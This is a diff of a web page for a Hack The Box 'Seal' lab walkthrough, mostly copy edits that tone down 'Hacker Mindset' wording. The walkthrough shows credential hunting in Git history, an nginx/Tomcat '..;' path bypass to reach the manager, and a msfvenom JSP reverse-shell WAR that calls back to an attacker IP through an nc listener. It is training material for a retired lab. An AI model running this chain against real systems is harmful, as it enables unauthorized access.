@@ -4,20 +4,19 @@
 15:I[484,[],"OutletBoundary"]
 16:"$Sreact.suspense"
 :HL["/writing/covers/hackthebox-seal-walkthrough.webp","image"]
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Seal Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Seal machine, preserved from Abdullah Kareem's OSEP Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T16:06:37.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[13," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-seal-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Seal machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Seal machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/seal","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","enumeration",{"children":["$","a",null,{"href":"#enumeration","children":"Enumeration"}]}],["$","li","initial-reconnaissance",{"children":["$","a",null,{"href":"#initial-reconnaissance","children":"Initial Reconnaissance"}]}],["$","li","gitbucket-the-goldmine",{"children":["$","a",null,{"href":"#gitbucket-the-goldmine","children":"GitBucket - The Goldmine"}]}],["$","li","tomcat-manager-access-via-path-traversal",{"children":["$","a",null,{"href":"#tomcat-manager-access-via-path-traversal","children":"Tomcat Manager Access via Path Traversal"}]}],["$","li","foothold-war-reverse-shell",{"children":["$","a",null,{"href":"#foothold-war-reverse-shell","children":"Foothold - WAR Reverse Shell"}]}],["$","li","lateral-movement-to-user-luis",{"children":["$","a",null,{"href":"#lateral-movement-to-user-luis","children":"Lateral Movement to User (luis)"}]}],"$L4","$L5","$L6","$L7"]}]]}],"$L8"],"$L9","$La",["$Lb","$Lc","$Ld"]]}],"$Le"]}]]}],"$Lf"]}],"$L10","$L11"],null,"$L12"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"zs2c_HJI2CXWwLDIPVraL"}
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Seal Walkthrough"}],["$","p",null,{"className":"article-dek","children":"GitBucket history exposes Tomcat credentials, a proxy path-normalization flaw permits WAR deployment, and an Ansible backup symlink steals a user's SSH key before sudo access to playbooks yields root."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T16:06:37.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[12," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-seal-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Seal machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Seal machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/seal","target":"_blank","rel":"nofollow noopener noreferrer","children":"Hack The Box machine artwork"}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","enumeration",{"children":["$","a",null,{"href":"#enumeration","children":"Enumeration"}]}],["$","li","initial-reconnaissance",{"children":["$","a",null,{"href":"#initial-reconnaissance","children":"Initial Reconnaissance"}]}],["$","li","gitbucket-history",{"children":["$","a",null,{"href":"#gitbucket-history","children":"GitBucket history"}]}],["$","li","tomcat-manager-access-via-path-traversal",{"children":["$","a",null,{"href":"#tomcat-manager-access-via-path-traversal","children":"Tomcat Manager Access via Path Traversal"}]}],["$","li","foothold-war-reverse-shell",{"children":["$","a",null,{"href":"#foothold-war-reverse-shell","children":"Foothold - WAR Reverse Shell"}]}],["$","li","lateral-movement-to-user-luis",{"children":["$","a",null,{"href":"#lateral-movement-to-user-luis","children":"Lateral Movement to User (luis)"}]}],"$L4","$L5","$L6","$L7"]}]]}],"$L8"],"$L9","$La",["$Lb","$Lc","$Ld"]]}],"$Le"]}]]}],"$Lf"]}],"$L10","$L11"],null,"$L12"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"EBRi0HxexS1XMGpfUl_9d"}
 4:["$","li","privilege-escalation-to-root",{"children":["$","a",null,{"href":"#privilege-escalation-to-root","children":"Privilege Escalation to Root"}]}]
 5:["$","li","flags",{"children":["$","a",null,{"href":"#flags","children":"Flags"}]}]
-6:["$","li","hacker-mindset-and-lessons-learned",{"children":["$","a",null,{"href":"#hacker-mindset-and-lessons-learned","children":"Hacker Mindset & Lessons Learned"}]}]
+6:["$","li","lessons-learned",{"children":["$","a",null,{"href":"#lessons-learned","children":"Lessons learned"}]}]
 7:["$","li","tools-used",{"children":["$","a",null,{"href":"#tools-used","children":"Tools Used"}]}]
-8:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page · ",10," sections"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","enumeration",{"children":["$","a",null,{"href":"#enumeration","children":"Enumeration"}]}],["$","li","initial-reconnaissance",{"children":["$","a",null,{"href":"#initial-reconnaissance","children":"Initial Reconnaissance"}]}],["$","li","gitbucket-the-goldmine",{"children":["$","a",null,{"href":"#gitbucket-the-goldmine","children":"GitBucket - The Goldmine"}]}],["$","li","tomcat-manager-access-via-path-traversal",{"children":["$","a",null,{"href":"#tomcat-manager-access-via-path-traversal","children":"Tomcat Manager Access via Path Traversal"}]}],["$","li","foothold-war-reverse-shell",{"children":["$","a",null,{"href":"#foothold-war-reverse-shell","children":"Foothold - WAR Reverse Shell"}]}],["$","li","lateral-movement-to-user-luis",{"children":["$","a",null,{"href":"#lateral-movement-to-user-luis","children":"Lateral Movement to User (luis)"}]}],["$","li","privilege-escalation-to-root",{"children":["$","a",null,{"href":"#privilege-escalation-to-root","children":"Privilege Escalation to Root"}]}],["$","li","flags",{"children":["$","a",null,{"href":"#flags","children":"Flags"}]}],["$","li","hacker-mindset-and-lessons-learned",{"children":["$","a",null,{"href":"#hacker-mindset-and-lessons-learned","children":"Hacker Mindset & Lessons Learned"}]}],["$","li","tools-used",{"children":["$","a",null,{"href":"#tools-used","children":"Tools Used"}]}]]}]}]]}]
-9:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSEP-Prep/blob/f7f46a4b549d12f28de2bee8b7a2e1e812f717e2/HTB-Seal.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSEP-Prep"," · f7f46a4b549d",""]}]]]}]
-a:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Seal"," · Linux"," · Medium"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/seal","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]
+8:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page (",10," sections)"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","enumeration",{"children":["$","a",null,{"href":"#enumeration","children":"Enumeration"}]}],["$","li","initial-reconnaissance",{"children":["$","a",null,{"href":"#initial-reconnaissance","children":"Initial Reconnaissance"}]}],["$","li","gitbucket-history",{"children":["$","a",null,{"href":"#gitbucket-history","children":"GitBucket history"}]}],["$","li","tomcat-manager-access-via-path-traversal",{"children":["$","a",null,{"href":"#tomcat-manager-access-via-path-traversal","children":"Tomcat Manager Access via Path Traversal"}]}],["$","li","foothold-war-reverse-shell",{"children":["$","a",null,{"href":"#foothold-war-reverse-shell","children":"Foothold - WAR Reverse Shell"}]}],["$","li","lateral-movement-to-user-luis",{"children":["$","a",null,{"href":"#lateral-movement-to-user-luis","children":"Lateral Movement to User (luis)"}]}],["$","li","privilege-escalation-to-root",{"children":["$","a",null,{"href":"#privilege-escalation-to-root","children":"Privilege Escalation to Root"}]}],["$","li","flags",{"children":["$","a",null,{"href":"#flags","children":"Flags"}]}],["$","li","lessons-learned",{"children":["$","a",null,{"href":"#lessons-learned","children":"Lessons learned"}]}],["$","li","tools-used",{"children":["$","a",null,{"href":"#tools-used","children":"Tools Used"}]}]]}]}]]}]
+9:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSEP-Prep/blob/f7f46a4b549d12f28de2bee8b7a2e1e812f717e2/HTB-Seal.md","target":"_blank","rel":"nofollow noopener noreferrer","children":"Immutable source revision"}],["$","small",null,{"children":["CyberKareem/OSEP-Prep",", commit f7f46a4b549d",""]}]]]}]
+a:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Seal, Linux, Medium",". Retired status verified ","12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/seal","target":"_blank","rel":"nofollow noopener noreferrer","children":"Open Hack The Box profile"}]]}]
 b:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Seal machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
-c:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-d:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"5 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-13:T6464,
-<p><strong>Machine:</strong> Seal<br /><strong>OS:</strong> Linux<br /><strong>Difficulty:</strong> Medium<br /><strong>IP:</strong> <code>10.129.95.190</code><br /><strong>Attacker IP:</strong> <code>10.10.17.27</code>  </p>
-<hr />
+c:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported from Abdullah Kareem's public preparation notes and lightly copy-edited for clarity. Commands and technical claims remain tied to the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+d:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"4 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+13:T5fa2,<p><strong>Machine:</strong> Seal<br><strong>OS:</strong> Linux<br><strong>Difficulty:</strong> Medium<br><strong>IP:</strong> <code>10.129.95.190</code><br><strong>Attacker IP:</strong> <code>10.10.17.27</code>  </p>
+<hr>
 
 
 
@@ -25,9 +24,9 @@ d:["$","div","editorial-correction-2",{"className":"article-review-note article-
 <h3 id="step-1-add-target-to-etc-hosts">Step 1: Add target to /etc/hosts</h3>
 <pre><code class="language-bash" data-language="bash">echo "10.129.95.190 seal.htb" | sudo tee -a /etc/hosts
 </code></pre>
-<p><strong>Why this matters:</strong> The SSL certificate on port 443 reveals the hostname <code>seal.htb</code>. Many web applications perform virtual host routing based on the <code>Host</code> header. Without this DNS mapping, we might miss important functionality or get redirected to invalid domains.</p>
-<p><strong>Hacker Mindset:</strong> <em>Always check SSL certificates.</em> They often contain domain names, organization info, and sometimes even email addresses that expand your attack surface. This is passive reconnaissance at its finest.</p>
-<hr />
+<p> The SSL certificate on port 443 reveals the hostname <code>seal.htb</code>. Many web applications perform virtual host routing based on the <code>Host</code> header. Without this DNS mapping, we might miss important functionality or get redirected to invalid domains.</p>
+<p> <em>Always check SSL certificates.</em> They often contain domain names, organization info, and sometimes even email addresses that expand your attack surface. This is passive reconnaissance at its finest.</p>
+<hr>
 <h3 id="step-2-service-discovery-nmap">Step 2: Service Discovery (Nmap)</h3>
 <pre><code class="language-bash" data-language="bash">nmap -sV -v -p- --min-rate=10000 10.129.95.190
 </code></pre>
@@ -37,8 +36,8 @@ d:["$","div","editorial-correction-2",{"className":"article-review-note article-
 <li><strong>Port 443/tcp</strong> - nginx 1.18.0 (Ubuntu) - HTTPS</li>
 <li><strong>Port 8080/tcp</strong> - GitBucket</li>
 </ul>
-<p><strong>Hacker Mindset:</strong> <em>Port 8080 is your friend.</em> When you see port 443 (standard HTTPS) alongside 8080, 8080 is almost always some kind of backend service, admin panel, or development tool. The combination of nginx + another HTTP service screams "reverse proxy" - and reverse proxies are notorious for path normalization bugs.</p>
-<hr />
+<p> <em>Port 8080 is your friend.</em> When you see port 443 (standard HTTPS) alongside 8080, 8080 is almost always some kind of backend service, admin panel, or development tool. The combination of nginx + another HTTP service suggests "reverse proxy" - and reverse proxies are notorious for path normalization bugs.</p>
+<hr>
 <h2 id="initial-reconnaissance">Initial Reconnaissance</h2>
 <h3 id="step-3-explore-port-443-the-main-website">Step 3: Explore Port 443 (The Main Website)</h3>
 <p>Visit <code>https://seal.htb</code> in the browser.</p>
@@ -56,12 +55,12 @@ d:["$","div","editorial-correction-2",{"className":"article-review-note article-
 <li><code>/manager/html</code> returns <strong>403 Forbidden</strong></li>
 <li><code>/admin/dashboard</code> is protected by mutual TLS authentication</li>
 </ul>
-<p><strong>Hacker Mindset:</strong> <em>When you see 403 Forbidden on <code>/manager</code> or <code>/admin</code>, don't give up.</em> A 403 means the resource EXISTS but you can't access it. This is fundamentally different from a 404. The server is telling you "there's something here, but I'm not letting you in." Your job is to find the bypass.</p>
-<hr />
+<p> <em>When you see 403 Forbidden on <code>/manager</code> or <code>/admin</code>, don't give up.</em> A 403 means the resource EXISTS but you can't access it. This is fundamentally different from a 404. The server is telling you "there's something here, but I'm not letting you in." The next step is to find the bypass.</p>
+<hr>
 <h3 id="step-4-explore-port-8080-gitbucket">Step 4: Explore Port 8080 (GitBucket)</h3>
 <p>Visit <code>http://seal.htb:8080</code></p>
 <p><strong>What we see:</strong> GitBucket - a GitHub-like platform powered by Scala.</p>
-<p><strong>Why this is huge:</strong> Code repositories often contain:</p>
+<p><strong>Why the finding matters:</strong> Code repositories often contain:</p>
 <ul>
 <li>Hardcoded credentials</li>
 <li>Configuration files with passwords</li>
@@ -69,27 +68,27 @@ d:["$","div","editorial-correction-2",{"className":"article-review-note article-
 <li>Infrastructure definitions</li>
 <li>Commit history with sensitive data</li>
 </ul>
-<p><strong>Hacker Mindset:</strong> <em>Version control is a treasure trove.</em> Developers frequently commit credentials "temporarily" and forget to remove them. Even if they "fix" it in a later commit, the sensitive data remains in the commit history forever. Always check the full commit history, not just the latest files.</p>
-<hr />
-<h2 id="gitbucket-the-goldmine">GitBucket - The Goldmine</h2>
+<p> <em>Version control is a useful source.</em> Developers frequently commit credentials "temporarily" and forget to remove them. Even if they "fix" it in a later commit, the sensitive data remains in the commit history forever. Always check the full commit history, not just the latest files.</p>
+<hr>
+<h2 id="gitbucket-history">GitBucket history</h2>
 <h3 id="step-5-register-a-gitbucket-account">Step 5: Register a GitBucket Account</h3>
 <p>Click <strong>Register</strong> and create any account (e.g., <code>testtest</code> / <code>password</code>).</p>
 <p><strong>Why:</strong> GitBucket allows self-registration. Once logged in, we can browse public repositories.</p>
-<hr />
+<hr>
 <h3 id="step-6-discover-repositories">Step 6: Discover Repositories</h3>
 <p>After logging in, we see two repositories under the <code>root</code> organization:</p>
 <ul>
 <li><code>root/seal_market</code> - The main web application</li>
 <li><code>root/infra</code> - Infrastructure configurations</li>
 </ul>
-<p><strong>Hacker Mindset:</strong> <em>Prioritize repositories based on names.</em> <code>seal_market</code> is clearly the main application. Infrastructure repos often contain deployment scripts, Docker files, and - most importantly - configuration files with credentials.</p>
-<hr />
+<p> <em>Prioritize repositories based on names.</em> <code>seal_market</code> is clearly the main application. Infrastructure repos often contain deployment scripts, Docker files, and - most importantly - configuration files with credentials.</p>
+<hr>
 <h3 id="step-7-analyze-seal-market-repository">Step 7: Analyze <code>seal_market</code> Repository</h3>
 <p>Navigate to <code>root/seal_market</code> → <code>tomcat/</code> directory.</p>
 <p><strong>What we find:</strong> <code>tomcat-users.xml</code> - the configuration file for Tomcat user authentication.</p>
 <p><strong>Current version:</strong> Contains no credentials (they were removed in the latest commit).</p>
-<p><strong>Hacker Mindset:</strong> <em>Always check commit history.</em> The current file might be clean, but developers often "remove" credentials by committing a new version without them. The old commit still exists in the repository's history.</p>
-<hr />
+<p> <em>Always check commit history.</em> The current file might be clean, but developers often "remove" credentials by committing a new version without them. The old commit still exists in the repository's history.</p>
+<hr>
 <h3 id="step-8-hunt-credentials-in-commit-history">Step 8: Hunt Credentials in Commit History</h3>
 <p>Navigate to the file history of <code>tomcat-users.xml</code>.</p>
 <p><strong>Commits found:</strong></p>
@@ -98,12 +97,12 @@ d:["$","div","editorial-correction-2",{"className":"article-review-note article-
 <li><code>ac21032</code> - "Adding tomcat configuration" (older)</li>
 </ol>
 <p>Click the <strong>older</strong> commit (<code>ac21032</code>) to view the diff.</p>
-<p><strong>JACKPOT:</strong></p>
-<pre><code class="language-xml" data-language="xml">&lt;user username="tomcat" password=REDACTED roles="manager-gui,admin-gui"/&gt;
+<p><strong>Finding:</strong></p>
+<pre><code class="language-xml" data-language="xml">&lt;user username="tomcat" password="REDACTED" roles="manager-gui,admin-gui"/&gt;
 </code></pre>
-<p><strong>Why this works:</strong> The developers added the configuration with credentials, then later "updated" it to remove the credentials. But Git preserves the entire history.</p>
-<p><strong>Hacker Mindset:</strong> <em>Think like a developer.</em> When you see "updating" a config file, ask yourself: "What was updated?" Often, "updates" are actually security fixes - which means the old version had a vulnerability (or credential) that you can exploit.</p>
-<hr />
+<p><strong>Mechanism:</strong> The developers added the configuration with credentials, then later "updated" it to remove the credentials. But Git preserves the entire history.</p>
+<p> <em>Review the implementation.</em> When you see "updating" a config file, ask yourself: "What was updated?" Often, "updates" are actually security fixes - which means the old version had a vulnerability (or credential) that you can exploit.</p>
+<hr>
 <h3 id="step-9-verify-tomcat-manager-access">Step 9: Verify Tomcat Manager Access</h3>
 <p>With credentials in hand, try accessing the Tomcat Manager:</p>
 <pre><code class="language-bash" data-language="bash">curl -k -u REDACTED https://seal.htb/manager/html
@@ -114,8 +113,8 @@ d:["$","div","editorial-correction-2",{"className":"article-review-note article-
 <li><code>https://seal.htb/manager/status</code> - Works (asks for auth, accepts credentials)</li>
 <li><code>https://seal.htb/manager/jmxproxy</code> - Also works with auth</li>
 </ul>
-<p><strong>Hacker Mindset:</strong> <em>A 403 on one endpoint doesn't mean total failure.</em> Tomcat has multiple manager interfaces (<code>/html</code>, <code>/text</code>, <code>/jmxproxy</code>, <code>/status</code>). If one is blocked, test them all. The HTML interface (<code>/manager/html</code>) is the most powerful because it allows WAR deployment.</p>
-<hr />
+<p> <em>A 403 on one endpoint doesn't mean total failure.</em> Tomcat has multiple manager interfaces (<code>/html</code>, <code>/text</code>, <code>/jmxproxy</code>, <code>/status</code>). If one is blocked, test them all. The HTML interface (<code>/manager/html</code>) is the most powerful because it allows WAR deployment.</p>
+<hr>
 <h2 id="tomcat-manager-access-via-path-traversal">Tomcat Manager Access via Path Traversal</h2>
 <h3 id="step-10-the-nginx-tomcat-path-normalization-bug">Step 10: The Nginx-Tomcat Path Normalization Bug</h3>
 <p><strong>The Core Vulnerability:</strong></p>
@@ -130,9 +129,9 @@ d:["$","div","editorial-correction-2",{"className":"article-review-note article-
 <li>nginx sees <code>/manager/status/..;/html</code> and thinks: "<code>status/..</code> cancels out, leaving <code>/manager/html</code>"</li>
 <li>But Tomcat sees <code>/manager/status/..;/html</code> and interprets <code>..;</code> differently, routing to <code>/manager/html</code> while bypassing nginx's access controls</li>
 </ul>
-<p><strong>Hacker Mindset:</strong> <em>Understand your architecture.</em> When you see nginx + Tomcat, immediately think about path normalization differences. This is a well-known attack pattern. The Acunetix article on "Tomcat path traversal via reverse proxy mapping" documents this exact scenario.</p>
-<p><strong>Hacker Mindset:</strong> <em>Parsers are evil.</em> Every time two systems parse the same input differently, there's a potential vulnerability. URL parsing, path normalization, HTTP header parsing - these are all prime targets for bypasses.</p>
-<hr />
+<p> <em>Understand your architecture.</em> When you see nginx + Tomcat, immediately think about path normalization differences. This is a well-known attack pattern. The Acunetix article on "Tomcat path traversal via reverse proxy mapping" documents this exact scenario.</p>
+<p> <em>Parsers are evil.</em> Every time two systems parse the same input differently, there's a potential vulnerability. URL parsing, path normalization, HTTP header parsing - these are all prime targets for bypasses.</p>
+<hr>
 <h3 id="step-11-access-the-manager-via-bypass">Step 11: Access the Manager via Bypass</h3>
 <p><strong>Browser:</strong></p>
 <pre><code>https://seal.htb/manager/status/..;/html
@@ -140,7 +139,7 @@ d:["$","div","editorial-correction-2",{"className":"article-review-note article-
 <p><strong>Authentication:</strong></p>
 <ul>
 <li>Username: <code>tomcat</code></li>
-<li>Password: null</li>
+<li>Password: <code>REDACTED</code></li>
 </ul>
 <p><strong>Result:</strong> Full access to the Tomcat Web Application Manager!</p>
 <p><strong>Alternative bypass paths that also work:</strong></p>
@@ -148,22 +147,22 @@ d:["$","div","editorial-correction-2",{"className":"article-review-note article-
 https://seal.htb/manager/foo/..;/html
 https://seal.htb/admin/foo/..;/dashboard/
 </code></pre>
-<p><strong>Hacker Mindset:</strong> <em>When you find one bypass, keep fuzzing.</em> Different bypass variants might work for different operations (GET vs POST, upload vs listing). Having multiple bypass strings in your arsenal gives you flexibility.</p>
-<hr />
+<p> <em>When you find one bypass, keep fuzzing.</em> Different bypass variants might work for different operations (GET vs POST, upload vs listing). Having multiple bypass strings in your arsenal gives you flexibility.</p>
+<hr>
 <h2 id="foothold-war-reverse-shell">Foothold - WAR Reverse Shell</h2>
 <h3 id="step-12-generate-a-war-reverse-shell">Step 12: Generate a WAR Reverse Shell</h3>
 <p>On Kali:</p>
 <pre><code class="language-bash" data-language="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.27 LPORT=4444 -f war -o shell.war
 </code></pre>
 <p><strong>Why a WAR file:</strong> Tomcat's primary deployment format is WAR (Web Application Archive). The manager interface allows uploading WAR files, which Tomcat automatically deploys as running web applications.</p>
-<p><strong>Hacker Mindset:</strong> <em>Use the platform's native deployment mechanism.</em> Tomcat is designed to deploy WARs. Instead of trying to exploit a buffer overflow or SQL injection, we're simply using Tomcat's legitimate functionality - but with a malicious payload. This is much more reliable.</p>
-<hr />
+<p> <em>Use the platform's native deployment mechanism.</em> Tomcat is designed to deploy WARs. Instead of trying to exploit a buffer overflow or SQL injection, we're simply using Tomcat's legitimate functionality - but with a malicious payload. This is much more reliable.</p>
+<hr>
 <h3 id="step-13-start-the-listener">Step 13: Start the Listener</h3>
 <p>On Kali:</p>
 <pre><code class="language-bash" data-language="bash">nc -nlvp 4444
 </code></pre>
 <p>Leave this running in a separate terminal.</p>
-<hr />
+<hr>
 <h3 id="step-14-deploy-the-war-shell">Step 14: Deploy the WAR Shell</h3>
 <p><strong>The Challenge:</strong> The upload form on the manager page submits to <code>/manager/html/upload</code>, which is blocked by nginx. We need to modify the form's action to use our bypass path.</p>
 <p><strong>Method 1: Browser DevTools</strong></p>
@@ -189,8 +188,8 @@ https://seal.htb/admin/foo/..;/dashboard/
   -F 'deployPath=/shell'
 </code></pre>
 <p><strong>Result:</strong> The WAR deploys successfully. A new application <code>/shell</code> appears in the applications list.</p>
-<p><strong>Hacker Mindset:</strong> <em>CSRF protection is client-side theater.</em> The CSRF nonce is generated by the server and validated on submission - but it's tied to your authenticated session. As long as you have a valid session and include the nonce, the server accepts the request. The path traversal bypass works because nginx doesn't see the destination you're actually hitting.</p>
-<hr />
+<p> <em>CSRF protection is client-side theater.</em> The CSRF nonce is generated by the server and validated on submission - but it's tied to your authenticated session. As long as you have a valid session and include the nonce, the server accepts the request. The path traversal bypass works because nginx doesn't see the destination you're actually hitting.</p>
+<hr>
 <h3 id="step-15-trigger-the-shell">Step 15: Trigger the Shell</h3>
 <p>Visit <code>https://seal.htb/shell/</code> in the browser (or click the <code>/shell</code> application in the manager).</p>
 <p><strong>On your Kali listener:</strong></p>
@@ -198,15 +197,15 @@ https://seal.htb/admin/foo/..;/dashboard/
 id
 uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
 </code></pre>
-<p><strong>Hacker Mindset:</strong> <em>Trigger the payload.</em> Many people deploy shells but forget to trigger them. A WAR shell needs an HTTP request to execute the JSP payload. Simply visiting the application's root URL is enough.</p>
-<hr />
